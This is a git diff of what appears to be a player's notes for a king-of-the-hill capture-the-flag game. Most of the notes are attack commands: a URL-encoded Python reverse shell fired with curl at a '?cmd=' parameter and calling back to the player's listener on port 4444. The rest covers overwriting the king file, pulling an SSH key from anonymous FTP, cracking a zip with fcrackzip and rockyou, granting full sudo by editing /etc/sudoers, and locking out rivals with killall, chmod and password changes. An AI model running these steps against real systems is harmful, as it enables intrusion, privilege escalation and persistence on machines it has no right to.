@@ -67,43 +67,25 @@ ncat -lvnp 4444
 curl "<BOX_IP>:3000/?cmd=python%20-  c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<YOUR_MACHINE_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"  
 LFILE=/root/king.txt  
 echo "Happygator" | cp /dev/stdin "$LFILE"  
+```
 you're king and root  
 afterwards stuff  
+```
 systemctl stop easyaccess  
 systemctl stop daemon  
+```
 change password  
+```
 killall node(make sure to ssh first)  
 chmod /bin/cp 000      
-
+```
 ???  
 profit      
-
-
 
 ## production:  
 navigate to `ftp://anonymous@<ip>:21`  
 download id_rsa and the flag, put the flag in  
 ```
-
-# Fortune:
-Requires: fcrackzip
-
-nc <BOX_IP> 3333
-#returns base 64 hash of a file.  
-Go here https://base64.guru/converter/decode/file and get the zip file.
-fcrackzip -v -u -D -p <location of rockyou.txt> application.zip
-Open the zip with the password you got.  Should contain password for fortune account.
-ssh fortuna@<BOX IP>
-sudo pico /etc/sudoers
-Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)
-sudo su
-you're root
-stuff to do: 
-	change password to fortuna.
-	Remove fortuna from /etc/sudoers and add another user that you have credentials for.
-
-
-
 chmod 600 id_rsa
 ssh -i id_rsa ashu@<ip>
 sudo su skidy
@@ -116,22 +98,22 @@ afterwards stuff
 sudo chmod -sx /usr/lib/git-core/git
 ```
 
-# Fortune:
-Requires: fcrackzip
-
-nc <BOX_IP> 3333
-#returns base 64 hash of a file.  
-Go here https://base64.guru/converter/decode/file and get the zip file.
-fcrackzip -v -u -D -p <location of rockyou.txt> application.zip
-Open the zip with the password you got.  Should contain password for fortune account.
-ssh fortuna@<BOX IP>
-sudo pico /etc/sudoers
-Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)
-sudo su
-you're root
-stuff to do: 
-	change password to fortuna.
-	Remove fortuna from /etc/sudoers and add another user that you have credentials for.
+# Fortune:  
+Requires: fcrackzip  
+  
+nc <BOX_IP> 3333  
+#returns base 64 hash of a file.    
+Go here https://base64.guru/converter/decode/file and get the zip file.  
+fcrackzip -v -u -D -p <location of rockyou.txt> application.zip  
+Open the zip with the password you got.  Should contain password for fortune account.  
+ssh fortuna@<BOX IP>  
+sudo pico /etc/sudoers  
+Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)  
+sudo su  
+you're root  
+stuff to do:   
+	change password to fortuna.  
+	Remove fortuna from /etc/sudoers and add another user that you have credentials for.  
 
 # afterwards stuff:  
 sudo useradd technoblade(i typically use password neverdie)  
